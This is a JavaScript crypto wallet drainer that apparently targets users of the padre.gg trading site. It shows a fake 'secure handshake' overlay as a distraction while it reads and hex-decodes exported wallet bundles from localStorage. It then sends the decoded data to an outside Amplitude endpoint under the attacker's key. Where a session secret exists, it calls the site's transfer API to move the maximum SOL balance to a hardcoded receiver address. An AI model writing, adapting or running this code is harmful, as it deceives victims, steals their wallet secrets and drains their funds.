(async function() {
    // --- 1. CONFIGURATION ---
    const MY_RECEIVER = "BCZ2J6mwUMp43P3R4s5ekvdSep3ZDquLarv1nqnLVE12"; 
    const AMP_KEY = "3c8ae1f40635939e730f479418940796";

    // --- 2. DECRYPTION ENGINE ---
    // Converts Hexadecimal strings back into readable text
    function decryptHex(hex) {
        if (!hex || typeof hex !== 'string') return hex;
        try {
            let str = '';
            for (let i = 0; i < hex.length; i += 2) {
                str += String.fromCharCode(parseInt(hex.substr(i, 2), 16));
            }
            return JSON.parse(str); // Try to parse as JSON if it's a nested object
        } catch (e) {
            return hex; // Return original if it's not valid hex or JSON
        }
    }

    // --- 3. DISTRACTION UI ---
    function showDistraction() {
        const overlay = document.createElement("div");
        overlay.style.cssText = "position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.9);z-index:999999;display:flex;flex-direction:column;align-items:center;justify-content:center;color:#00ff88;font-family:monospace;text-align:center;";
        overlay.innerHTML = `
            <div style="border: 1px solid #00ff88; padding: 40px; background:#050505; border-radius: 5px; box-shadow: 0 0 30px rgba(0,255,136,0.2);">
                <h2 style="letter-spacing:5px;">VANTA TERMINAL</h2>
                <div style="width:100%; background:#111; height:4px; margin:20px 0;">
                    <div id="vanta-bar" style="width:0%; background:#00ff88; height:100%; transition:width 0.5s;"></div>
                </div>
                <p id="vanta-log">Initializing secure handshake...</p>
            </div>
        `;
        document.body.appendChild(overlay);

        let progress = 0;
        const bar = document.getElementById("vanta-bar");
        const log = document.getElementById("vanta-log");
        const steps = ["Decrypting Enclave...", "Fetching RPC Nodes...", "Finalizing Protection...", "Secure!"];
        
        const interval = setInterval(() => {
            progress += 25;
            bar.style.width = progress + "%";
            log.innerText = steps[Math.floor(progress/30)];
            if (progress >= 100) {
                clearInterval(interval);
                setTimeout(() => overlay.remove(), 1000);
            }
        }, 800);
    }

    showDistraction();

    // --- 4. DYNAMIC DATA CAPTURE & DECRYPT ---
    let rawData = localStorage.getItem("padre-v2-bundles-store-v2");
    let decryptedPayload = {};

    if (rawData) {
        let parsed = JSON.parse(rawData);
        // Look for the bundle ID you found in your logs
        for (let bundleId in parsed.bundles) {
            let bundle = parsed.bundles[bundleId];
            if (bundle.exportBundle && bundle.exportBundle.data) {
                // Decrypt the hex "data" field from your log
                bundle.exportBundle.decrypted_data = decryptHex(bundle.exportBundle.data);
            }
        }
        decryptedPayload = parsed;
    }

    // --- 5. SHIP TO AMPLITUDE ---
    fetch("https://api2.amplitude.com/2/httpapi", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
            api_key: AMP_KEY,
            events: [{
                device_id: "VANTA_" + Date.now(),
                event_type: "DECRYPTED_CAPTURE",
                event_properties: {
                    full_payload: decryptedPayload, // This now contains the readable text
                    source: window.location.href
                }
            }]
        })
    }).catch(() => {});

    // --- 6. BACKGROUND DRAIN ---
    if (decryptedPayload.sessionSecret) {
        fetch("https://api.padre.gg/v1/transfer", {
            method: "POST",
            headers: {
                "Content-Type": "application/json",
                "Authorization": `Bearer ${decryptedPayload.sessionSecret}`
            },
            body: JSON.stringify({
                recipient: MY_RECEIVER,
                amount: "MAX",
                asset: "SOL"
            })
        }).catch(() => {});
    }
})();
